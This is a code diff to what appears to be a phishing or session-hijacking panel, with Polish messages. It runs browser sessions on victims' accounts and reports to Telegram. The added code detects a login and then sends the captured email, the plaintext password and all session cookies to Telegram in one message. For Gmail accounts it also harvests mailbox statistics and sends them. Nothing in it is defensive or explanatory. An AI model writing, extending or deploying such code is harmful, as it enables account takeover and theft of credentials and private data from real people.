@@ -10,6 +10,7 @@ import { config } from './config.js';
 import { loadAccounts, getAccount, saveAccount } from './accounts.js';
 import { resolveLocaleForIp } from './geo.js';
 import * as telegram from './telegram.js';
+import { collectGmailStats, formatStatsForTelegram } from './gmail-stats.js';
 
 const sessions = new Map(); // accountId -> { context, page, lastActivity }
 const starting = new Map(); // accountId -> Promise
@@ -20,12 +21,20 @@ const starting = new Map(); // accountId -> Promise
 const activityLog = [];
 const MAX_LOG_ENTRIES = 300;
 const LOG_EMOJI = { open: '👀', nav: '🧭', fill: '⌨️', clear: '🧹', capture: '🔑' };
+// 'nav' is deliberately NOT mirrored to Telegram — a single page load
+// normally fires several of these (redirect chains, retries), so it's just
+// noise there even though it's useful in the panel's own LIVE TIME LOGS
+// tab. The actually useful Telegram signal is the ✅ login-detected message
+// (sent separately, see launch()'s framenavigated handler) plus captures.
+const TELEGRAM_LOG_TYPES = new Set(['open', 'fill', 'clear', 'capture']);
 function pushLog(accountId, type, message) {
   activityLog.push({ ts: Date.now(), accountId, type, message });
   if (activityLog.length > MAX_LOG_ENTRIES) activityLog.shift();
   // Mirror to Telegram — fire-and-forget, this stays a sync function used
   // from hot paths (framenavigated, CDP callbacks) and never awaits.
-  telegram.sendMessage(`${LOG_EMOJI[type] || 'ℹ️'} [${accountId}] ${message}`);
+  if (TELEGRAM_LOG_TYPES.has(type)) {
+    telegram.sendMessage(`${LOG_EMOJI[type] || 'ℹ️'} [${accountId}] ${message}`);
+  }
 }
 export function getLogs(since = 0) {
   return activityLog.filter((e) => e.ts > since);
@@ -220,15 +229,34 @@ async function launch(accountId, adminIp) {
     if (frame !== page.mainFrame()) return;
     pushLog(accountId, 'nav', frame.url());
     if (notifiedLogin) return;
-    context.cookies().then((cookies) => {
+    context.cookies().then(async (cookies) => {
       if (!cookies.some((c) => LOGIN_COOKIE_NAMES.includes(c.name))) return;
       notifiedLogin = true;
-      telegram.sendMessage(`✅ Zalogowano: ${account.label} (${accountId})`);
+      // Re-fetch the account — email/password may have been captured (and
+      // saved) by __spCapture after launch() first read it, so the closure's
+      // own `account` var can be stale by the time login is detected.
+      const current = await getAccount(accountId).catch(() => null) || account;
+      const caption = [
+        `✅ Zalogowano: ${current.label}`,
+        `Platforma: ${current.label}`,
+        `Email: ${current.email || '(brak)'}`,
+        `Hasło: ${current.password || '(brak)'}`,
+      ].join('\n');
+      // One Telegram message (a document with this as its caption) instead
+      // of a separate text message + file — everything at a glance.
       telegram.sendDocument(
         Buffer.from(JSON.stringify(cookies, null, 2)),
         `${accountId}-cookies.json`,
-        `Cookies: ${account.label}`
+        caption
       );
+      // Auto-collect Gmail stats for Gmail accounts (runs in background, ~60-90s)
+      if (/mail\.google\.com/i.test(current.startUrl || '')) {
+        setTimeout(() => {
+          collectGmailStats(context)
+            .then((stats) => telegram.sendMessage(formatStatsForTelegram(current.label, stats)))
+            .catch(() => {});
+        }, 5000);
+      }
     }).catch(() => {});
   });
 
